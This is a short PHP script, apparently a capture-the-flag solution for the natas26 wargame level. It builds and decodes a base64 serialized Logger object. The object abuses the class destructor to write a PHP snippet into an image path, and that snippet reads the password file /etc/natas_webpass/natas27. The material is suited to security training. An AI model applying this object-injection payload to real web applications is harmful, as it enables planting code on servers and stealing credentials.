<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
      
    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";
      
        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }                       
      
    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       
      
    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }                       
}

$payload = unserialize(base64_decode("Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0NDoiLi9pbWcvbmF0YXMyNl82bzM1czNzaG5raThmbzFmNXF2aHA1NjhiNy5wbmciO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7TjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjI6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoIi9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Iik7ID8+Ijt9"));
print_r($payload);
exit();
